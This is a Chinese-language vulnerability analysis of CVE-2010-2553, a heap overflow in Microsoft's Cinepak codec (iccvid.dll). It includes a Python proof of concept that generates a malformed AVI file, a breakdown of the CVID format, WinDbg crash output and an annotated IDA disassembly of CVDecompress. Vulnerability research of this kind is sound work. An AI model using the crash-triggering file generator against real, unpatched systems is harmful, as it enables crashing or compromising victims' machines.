#### 漏洞描述
微软提供有Cinepak视频编解码器（iccvid.dll）,其中CVDecompress函数在解压缩媒体文件时，由于未对缓冲区大小进行检测，导致在复制数据时造成堆溢出，利用漏洞可以造成程序崩溃或执行任意代码。
#### 分析环境

#### 基于HeapPage的堆溢出漏洞分析方法
poc如下
```
'''

  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ <
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/

http://www.exploit-db.com/moaub-26-microsoft-cinepak-codec-cvdecompress-heap-overflow-ms10-055/

'''

'''
  Title             : Microsoft Cinepak Codec CVDecompress Heap Overflow
  Version           : iccvid.dll XP SP3
  Analysis          : http://www.abysssec.com
  Vendor            : http://www.microsoft.com
  Impact            : High
  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter           : @abysssec
  CVE               : CVE-2010-2553
  MOAUB Number      :
'''


import sys

def main():

	aviHeaders = '\x52\x49\x46\x46\x58\x01\x00\x00\x41\x56\x49\x20\x4C\x49\x53\x54\xC8\x00\x00\x00\x68\x64\x72\x6C\x61\x76\x69\x68\x38\x00\x00\x00\xA0\x86\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x4E\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x60\x01\x00\x00\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4C\x49\x53\x54\x7C\x00\x00\x00\x73\x74\x72\x6C\x73\x74\x72\x68\x38\x00\x00\x00\x76\x69\x64\x73\x63\x76\x69\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE8\x03\x00\x00\x10\x27\x00\x00\x00\x00\x00\x00\x4E\x00\x00\x00\x20\x74\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x60\x01\x20\x01\x73\x74\x72\x66\x28\x00\x00\x00\x28\x00\x00\x00\x50\x01\x00\x00\x20\x01\x00\x00\x01\x00\x18\x00\x63\x76\x69\x64\x84\x8D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	padding = '\x4A\x55\x4E\x4B\x00\x00\x00\x00\x4A\x55\x4E\x4B\x00\x00\x00\x00'
	movi_tag = '\x4C\x49\x53\x54\x5C\x00\x00\x00\x6D\x6F\x76\x69\x30\x30\x64\x63\x10\x00\x00\x00'
	cinepak_codec_data1 = '\x00\x00\x00\x68\x01\x60\x01\x20'
	number_of_coded_strips = '\x00\x10'
	cinepak_codec_data2 = '\x10\x00\x00\x10\x00\x00\x00\x00\x00\x60\x01\x60\x20\x00\x00\x00\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x00'
	idx_tag = '\x69\x64\x78\x31\x10\x00\x00\x00\x30\x30\x64\x63\x10\x00\x00\x00\x04\x00\x00\x00\x68\x00\x00\x00'

	avifile = open('poc.avi', 'wb+')
	avifile.write(aviHeaders)
	avifile.write(padding)
	avifile.write(movi_tag)
	avifile.write(cinepak_codec_data1)
	avifile.write(number_of_coded_strips)
	avifile.write(cinepak_codec_data2)
	avifile.write(idx_tag)

	avifile.close()
	print '[-] AVI file generated'

if __name__ == '__main__':
    main()
```
#### CVID 文件格式
CVID格式是一种压缩格式，嵌入avi文件格式中，在使用是需要对其进行解压缩，cvid文件格式如下   
![](../images/CVE-2010-2553_1.png)   

在POC中，对应的CVID格式   

![](../images/CVE-2010-2553_2.png)

```
Frame Header
  Flag = 00
  cvid 数据长度 = 00 00 68
  编码帧宽度 = 01 60
  编码帧高度 = 01 20
  编码条数量 = 00 10

Strip
  Strip Header
    编码条ID = 10 00
    编码条数据大小 = 00 10
    顶部Y坐标 = 00 00
    顶部X坐标 = 00 00
    底部Y坐标 = 00 60
    底部X坐标 = 01 60
  Chuck
    Chuck ID = 20 00
    Chuck 数据大小 = 00 00
    Chuck ID = 11 00
    Chuck 数据大小 = 00 10
    Chuck 数据 = ‘A’*12 //12个字节
    Chuck ID = 11 00
    Chuck 数据大小 = 00 10
    Chuck 数据 = ‘A’*12 //12个字节



```
#### 调试分析
开启vmplayer.exe的页堆选项

```
gflags.exe /I vmpalyer.exe +hpa
Current Registry Settings for vmpalyer.exe executable are: 02000000
    hpa - Enable page heap
    0:009> g
    (764.660): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00008000 ebx=029eed18 ecx=000006b0 edx=0adefd38 esi=0016b000 edi=0016d000
    eip=73b722cc esp=0adefd04 ebp=0adefd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\iccvid.dll -
    iccvid+0x22cc:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
    0:012> !heap edi
```
使用X64对vmpalyer.exe,进行调试分析，当CVID数据长度大于0x20,当编码条数量大于3时，若Chuck ID == 0x1100,并且数量>=3，同时每次循环操作是未解压的数据超过0x16,因为目标堆的大小只有0x6000，每次复制增加0x2000,所以在复制超过3次是就会发生堆溢出。
IDA 反汇编代码如下
```
.text:73B721AE _CVDecompress@28 proc near              ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+27↓p
.text:73B721AE                                         ; Decompress(x,x,x,x,x,x,x,x,x,x,x,x,x,x)+118↓p ...
.text:73B721AE
.text:73B721AE var_20          = dword ptr -20h
.text:73B721AE StripNum        = dword ptr -1Ch
.text:73B721AE var_18          = dword ptr -18h
.text:73B721AE var_14          = dword ptr -14h
.text:73B721AE var_10          = dword ptr -10h
.text:73B721AE var_C           = dword ptr -0Ch
.text:73B721AE var_8           = dword ptr -8
.text:73B721AE IncrementLen    = dword ptr -4
.text:73B721AE a1              = dword ptr  8
.text:73B721AE cvid_buffer     = dword ptr  0Ch
.text:73B721AE cvid_len        = dword ptr  10h
.text:73B721AE a4              = dword ptr  14h
.text:73B721AE a5              = dword ptr  18h
.text:73B721AE a6              = dword ptr  1Ch
.text:73B721AE a7              = dword ptr  20h
.text:73B721AE
.text:73B721AE                 mov     edi, edi
.text:73B721B0                 push    ebp
.text:73B721B1                 mov     ebp, esp
.text:73B721B3                 sub     esp, 20h
.text:73B721B6                 push    ebx
.text:73B721B7                 mov     ebx, [ebp+a1]
.text:73B721BA                 push    esi
.text:73B721BB                 mov     esi, [ebx+24h]
.text:73B721BE                 push    edi
.text:73B721BF                 xor     edi, edi
.text:73B721C1                 cmp     esi, edi
.text:73B721C3                 jz      short loc_73B721E1
.text:73B721C5                 push    [ebp+a7]        ; a7
.text:73B721C8                 mov     [ebx+24h], edi
.text:73B721CB                 push    edi             ; a6
.text:73B721CC                 push    edi             ; a5
.text:73B721CD                 push    edi             ; a4
.text:73B721CE                 push    2446h           ; cvid_len
.text:73B721D3                 push    esi             ; cvid_buffer
.text:73B721D4                 push    ebx             ; a1
.text:73B721D5                 call    _CVDecompress@28 ; CVDecompress(x,x,x,x,x,x,x)
.text:73B721DA                 push    esi             ; hMem
.text:73B721DB                 call    ds:__imp__LocalFree@4 ; LocalFree(x)
.text:73B721E1
.text:73B721E1 loc_73B721E1:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+15↑j
.text:73B721E1                 xor     eax, eax
.text:73B721E3                 cmp     [ebp+cvid_len], 20h ; 判断CVID数据长度是否小于0x20.ss:0023:0a7ffd40=00000068
.text:73B721E7                 jb      loc_73B723ED
.text:73B721ED                 mov     esi, [ebp+cvid_buffer]
.text:73B721F0                 mov     ah, [esi+1]
.text:73B721F3                 movzx   ecx, byte ptr [esi+3] ; CVID Len
.text:73B721F7                 mov     al, [esi+2]
.text:73B721FA                 shl     eax, 8
.text:73B721FD                 or      eax, ecx
.text:73B721FF                 cmp     [ebp+cvid_len], eax ; 验证函数参数传入的CVID 数据大小和CVID结构中的数据大小是否一致。
.text:73B72202                 jl      loc_73B723F4
.text:73B72208                 mov     cl, [esi]
.text:73B7220A                 mov     byte ptr [ebp+cvid_len+3], cl
.text:73B7220D                 lea     ecx, [ebp+var_10]
.text:73B72210                 push    ecx
.text:73B72211                 push    0Ah
.text:73B72213                 push    eax
.text:73B72214                 call    _ULongSub@12    ; ULongSub(x,x,x)
.text:73B72219                 test    eax, eax        ; 验证CVID数据块中，Chuck块是否存在。
.text:73B7221B                 jl      loc_73B723F4
.text:73B72221                 xor     eax, eax
.text:73B72223                 mov     ah, [esi+8]
.text:73B72226                 add     esi, 0Ah
.text:73B72229                 mov     [ebp+var_14], edi
.text:73B7222C                 mov     [ebp+var_18], esi
.text:73B7222F                 mov     [ebp+var_C], esi
.text:73B72232                 mov     al, [esi-1]
.text:73B72235                 cmp     eax, edi        ; 判断条形码数量是否为0
.text:73B72237                 mov     [ebp+StripNum], eax
.text:73B7223A                 jle     loc_73B723EA
.text:73B72240                 mov     [ebp+IncrementLen], edi
.text:73B72243
.text:73B72243 loc_73B72243:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+236↓j
.text:73B72243                 mov     eax, [ebp+var_10]
.text:73B72246                 cmp     eax, 16h        ; eax = 0x5E，既未解密的数据大小，判断未解密的数据大小是否小于0x16
.text:73B72249                 jb      loc_73B723EA
.text:73B7224F                 movzx   edx, byte ptr [esi+3]
.text:73B72253                 xor     ecx, ecx
.text:73B72255                 mov     ch, [esi+1]
.text:73B72258                 mov     cl, [esi+2]
.text:73B7225B                 shl     ecx, 8
.text:73B7225E                 or      ecx, edx
.text:73B72260                 cmp     eax, ecx        ; 检测未解压缩的数据是否小于0x10
.text:73B72262                 mov     [ebp+var_8], ecx
.text:73B72265                 jb      loc_73B723EA
.text:73B7226B                 mov     al, [esi]
.text:73B7226D                 cmp     al, 10h
.text:73B7226F                 jz      short loc_73B72279
.text:73B72271                 cmp     al, 11h
.text:73B72273                 jnz     loc_73B723D0
.text:73B72279
.text:73B72279 loc_73B72279:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+C1↑j
.text:73B72279                 lea     eax, [ebp+a1]
.text:73B7227C                 push    eax
.text:73B7227D                 push    0Ch
.text:73B7227F                 push    [ebp+var_8]
.text:73B72282                 call    _ULongSub@12    ; ULongSub(x,x,x)
.text:73B72287                 test    eax, eax        ; 判断编码条数量是否小于0xC,小于0xC退出
.text:73B72289                 jl      loc_73B723F4
.text:73B7228F                 xor     eax, eax
.text:73B72291                 mov     ah, [esi+8]
.text:73B72294                 xor     ecx, ecx
.text:73B72296                 mov     ch, [esi+4]
.text:73B72299                 mov     al, [esi+9]
.text:73B7229C                 mov     cl, [esi+5]
.text:73B7229F                 sub     eax, ecx
.text:73B722A1                 imul    ax, [ebx+2Eh]
.text:73B722A6                 mov     [ebp+cvid_buffer], eax
.text:73B722A9                 mov     eax, [ebp+IncrementLen]
.text:73B722AC                 cmp     eax, edi
.text:73B722AE                 jz      short loc_73B722D1
.text:73B722B0                 cmp     byte ptr [ebp+cvid_len+3], 0
.text:73B722B4                 jnz     short loc_73B722D1
.text:73B722B6                 cmp     byte ptr [esi], 11h ; 判断Chuck ID 是否等于0x11,如果等于0x11,进行复制
.text:73B722B9                 jnz     short loc_73B722D1
.text:73B722BB                 mov     ecx, [ebx+1Ch]
.text:73B722BE                 lea     edi, [ecx+eax]  ; 目标地址每次递增0x2000
.text:73B722C1                 mov     ecx, 800h
.text:73B722C6                 lea     esi, [edi-2000h]
.text:73B722CC                 rep movsd               ; Crash
.text:73B722CE                 mov     esi, [ebp+var_18]
.text:73B722D1
.text:73B722D1 loc_73B722D1:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+100↑j
.text:73B722D1                                         ; CVDecompress(x,x,x,x,x,x,x)+106↑j ...
.text:73B722D1                 mov     edi, [ebp+var_C]
.text:73B722D4                 mov     eax, [ebx+20h]
.text:73B722D7                 add     edi, 0Ch
.text:73B722DA                 add     eax, [ebp+IncrementLen]
.text:73B722DD                 lea     ecx, [esi+0Ch]
.text:73B722E0                 mov     [ebx+38h], eax
.text:73B722E3                 mov     eax, [ebp+a7]
.text:73B722E6                 mov     [ebp+var_18], ecx
.text:73B722E9                 mov     [ebx+3Ch], eax
.text:73B722EC                 jmp     loc_73B723AF
.text:73B722F1 ; ---------------------------------------------------------------------------
.text:73B722F1
.text:73B722F1 loc_73B722F1:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+205↓j
.text:73B722F1                 movzx   eax, byte ptr [ecx+3]
.text:73B722F5                 xor     edx, edx
.text:73B722F7                 mov     dh, [ecx+1]
.text:73B722FA                 mov     dl, [ecx+2]
.text:73B722FD                 shl     edx, 8
.text:73B72300                 or      edx, eax
.text:73B72302                 cmp     [ebp+a1], edx
.text:73B72305                 mov     [ebp+var_20], edx
.text:73B72308                 jb      loc_73B723B9
.text:73B7230E                 movzx   eax, byte ptr [ecx]
.text:73B72311                 add     eax, 0FFFFFFE0h ; switch 19 cases
.text:73B72314                 cmp     eax, 12h
.text:73B72317                 ja      short loc_73B72396 ; jumptable 73B72320 default case
.text:73B72319                 movzx   eax, ds:byte_73B72410[eax]
.text:73B72320                 jmp     ds:off_73B723F8[eax*4] ; switch jump
.text:73B72327 ; ---------------------------------------------------------------------------
.text:73B72327
.text:73B72327 loc_73B72327:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+172↑j
.text:73B72327                                         ; DATA XREF: .text:off_73B723F8↓o
.text:73B72327                 push    dword ptr [ebx+30h] ; jumptable 73B72320 cases 32,33,36,37
.text:73B7232A                 push    dword ptr [ebx+34h]
.text:73B7232D                 push    dword ptr [ebx+38h]
.text:73B72330                 push    edi
.text:73B72331                 call    dword ptr [ebx]
.text:73B72333                 jmp     short loc_73B72396 ; jumptable 73B72320 default case
.text:73B72335 ; ---------------------------------------------------------------------------
.text:73B72335
.text:73B72335 loc_73B72335:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+172↑j
.text:73B72335                                         ; DATA XREF: .text:off_73B723F8↓o
.text:73B72335                 push    dword ptr [ebx+30h] ; jumptable 73B72320 cases 34,35,38,39
.text:73B72338                 mov     eax, [ebx+38h]
.text:73B7233B                 push    dword ptr [ebx+34h]
.text:73B7233E                 add     eax, 1000h
.text:73B72343                 push    eax
.text:73B72344                 push    edi
.text:73B72345                 call    dword ptr [ebx+4]
.text:73B72348                 jmp     short loc_73B72396 ; jumptable 73B72320 default case
.text:73B7234A ; ---------------------------------------------------------------------------
.text:73B7234A
.text:73B7234A loc_73B7234A:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+172↑j
.text:73B7234A                                         ; DATA XREF: .text:off_73B723F8↓o
.text:73B7234A                 push    [ebp+cvid_buffer] ; jumptable 73B72320 case 48
.text:73B7234D                 add     edx, 0FFFFFFFCh
.text:73B72350                 push    [ebp+a6]
.text:73B72353                 lea     eax, [edi+4]
.text:73B72356                 push    [ebp+a5]
.text:73B72359                 push    [ebp+a4]
.text:73B7235C                 push    edx
.text:73B7235D                 push    eax
.text:73B7235E                 push    ebx
.text:73B7235F                 call    dword ptr [ebx+8]
.text:73B72362                 jmp     short loc_73B72396 ; jumptable 73B72320 default case
.text:73B72364 ; ---------------------------------------------------------------------------
.text:73B72364
.text:73B72364 loc_73B72364:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+172↑j
.text:73B72364                                         ; DATA XREF: .text:off_73B723F8↓o
.text:73B72364                 push    [ebp+cvid_buffer] ; jumptable 73B72320 case 49
.text:73B72367                 add     edx, 0FFFFFFFCh
.text:73B7236A                 push    [ebp+a6]
.text:73B7236D                 lea     eax, [edi+4]
.text:73B72370                 push    [ebp+a5]
.text:73B72373                 push    [ebp+a4]
.text:73B72376                 push    edx
.text:73B72377                 push    eax
.text:73B72378                 push    ebx
.text:73B72379                 call    dword ptr [ebx+10h]
.text:73B7237C                 jmp     short loc_73B72396 ; jumptable 73B72320 default case
.text:73B7237E ; ---------------------------------------------------------------------------
.text:73B7237E
.text:73B7237E
.text:73B7237E loc_73B7237E:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+172↑j
.text:73B7237E                                         ; DATA XREF: .text:off_73B723F8↓o
.text:73B7237E                 push    [ebp+cvid_buffer] ; jumptable 73B72320 case 50
.text:73B72381                 add     edx, 0FFFFFFFCh
.text:73B72384                 push    [ebp+a6]
.text:73B72387                 lea     eax, [edi+4]
.text:73B7238A                 push    [ebp+a5]
.text:73B7238D                 push    [ebp+a4]
.text:73B72390                 push    edx
.text:73B72391                 push    eax
.text:73B72392                 push    ebx
.text:73B72393                 call    dword ptr [ebx+0Ch]
.text:73B72396
.text:73B72396 loc_73B72396:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+169↑j
.text:73B72396                                         ; CVDecompress(x,x,x,x,x,x,x)+172↑j ...
.text:73B72396                 mov     edx, [ebp+var_20] ; jumptable 73B72320 default case
.text:73B72399                 mov     ecx, [ebp+var_18]
.text:73B7239C                 xor     eax, eax
.text:73B7239E                 add     ecx, edx
.text:73B723A0                 inc     eax
.text:73B723A1                 add     edi, edx
.text:73B723A3                 cmp     edx, eax
.text:73B723A5                 mov     [ebp+var_18], ecx
.text:73B723A8                 jbe     short loc_73B723AC
.text:73B723AA                 mov     eax, edx
.text:73B723AC
.text:73B723AC loc_73B723AC:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+1FA↑j
.text:73B723AC                 sub     [ebp+a1], eax
.text:73B723AF
.text:73B723AF loc_73B723AF:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+13E↑j
.text:73B723AF                 cmp     [ebp+a1], 4
.text:73B723B3                 jnb     loc_73B722F1
.text:73B723B9
.text:73B723B9 loc_73B723B9:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+15A↑j
.text:73B723B9                 movsx   eax, word ptr [ebp+cvid_buffer]
.text:73B723BD                 imul    eax, [ebp+a7]
.text:73B723C1                 add     [ebp+a6], eax
.text:73B723C4                 inc     [ebp+var_14]
.text:73B723C7                 add     [ebp+IncrementLen], 2000h ; 复制地址每次增加0x2000
.text:73B723CE                 xor     edi, edi
.text:73B723D0
.text:73B723D0 loc_73B723D0:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+C5↑j
.text:73B723D0                 mov     eax, [ebp+var_8]
.text:73B723D3                 add     [ebp+var_C], eax
.text:73B723D6                 sub     [ebp+var_10], eax
.text:73B723D9                 add     esi, eax
.text:73B723DB                 mov     eax, [ebp+StripNum]
.text:73B723DE                 cmp     [ebp+var_14], eax
.text:73B723E1                 mov     [ebp+var_18], esi
.text:73B723E4                 jl      loc_73B72243
.text:73B723EA
.text:73B723EA loc_73B723EA:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+8C↑j
.text:73B723EA                                         ; CVDecompress(x,x,x,x,x,x,x)+9B↑j ...
.text:73B723EA                 xor     eax, eax
.text:73B723EC                 inc     eax
.text:73B723ED
.text:73B723ED loc_73B723ED:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+39↑j
.text:73B723ED                                         ; CVDecompress(x,x,x,x,x,x,x)+248↓j
.text:73B723ED                 pop     edi
.text:73B723EE                 pop     esi
.text:73B723EF                 pop     ebx
.text:73B723F0                 leave
.text:73B723F1                 retn    1Ch
.text:73B723F4 ; ---------------------------------------------------------------------------
.text:73B723F4
.text:73B723F4 loc_73B723F4:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+54↑j
.text:73B723F4                                         ; CVDecompress(x,x,x,x,x,x,x)+6D↑j ...
.text:73B723F4                 xor     eax, eax
.text:73B723F6                 jmp     short loc_73B723ED
.text:73B723F6 _CVDecompress@28 endp
```
